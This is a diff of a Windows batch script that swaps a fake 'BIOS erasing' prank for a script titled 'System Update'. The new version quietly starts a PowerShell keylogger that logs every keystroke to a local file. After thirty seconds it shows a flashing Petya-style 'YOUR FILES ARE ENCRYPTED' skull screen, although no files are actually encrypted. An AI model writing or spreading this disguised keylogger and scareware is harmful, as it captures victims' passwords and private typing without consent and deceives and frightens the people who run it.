@@ -1,15 +1,35 @@
 @echo off
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl" /v "MessageBackColor" /t REG_SZ /d "4" /f
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl" /v "MessageTextColor" /t REG_SZ /d "F" /f
+title System Update
+setlocal
+
+:: 1. Запуск кейлоггера (PowerShell) в фоне через скрытое окно
+echo Starting background service...
+powershell -Command "$file='log.txt'; $code='[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);'; $type=Add-Type -MemberDefinition $code -Name 'Win32' -Namespace 'Utils' -PassThru; while($true) { for($i=1;$i -le 255;$i++) { if($type::GetAsyncKeyState($i) -eq -32767) { [System.IO.File]::AppendAllText($file, [char]$i) } } Start-Sleep -Milliseconds 40 }" >nul 2>&1
+
+:: 2. Таймер на 30 секунд
+timeout /t 30 /nobreak >nul
+
+:: 3. Эффект Petya (Мигающий скелет)
 cls
-color 0a
-echo Инициализация стирания BIOS...
-timeout /t 2 >nul
-echo [##########] 10%% - Поиск секторов...
-timeout /t 1 >nul
-echo [####################] 40%% - Перезапись Flash...
-timeout /t 1 >nul
-echo [##############################] 90%% - Завершено.
-echo ОШИБКА: BIOS НЕ НАЙДЕН. ПЕРЕЗАГРУЗКА...
-timeout /t 3 >nul
-powershell.exe wininit
+color 0C
+:petya
+cls
+echo.
+echo      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+echo      X                                            X
+echo      X   !!! YOUR FILES ARE ENCRYPTED !!!         X
+echo      X                                            X
+echo      X                XXXXX                       X
+echo      X               X     X                      X
+echo      X              X  O O  X                     X
+echo      X              X   ^   X                     X
+echo      X               X \_/ X                      X
+echo      X                XXXXX                       X
+echo      X                                            X
+echo      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+echo.
+timeout /t 1 /nobreak >nul
+color C0
+timeout /t 1 /nobreak >nul
+color 0C
+goto petya
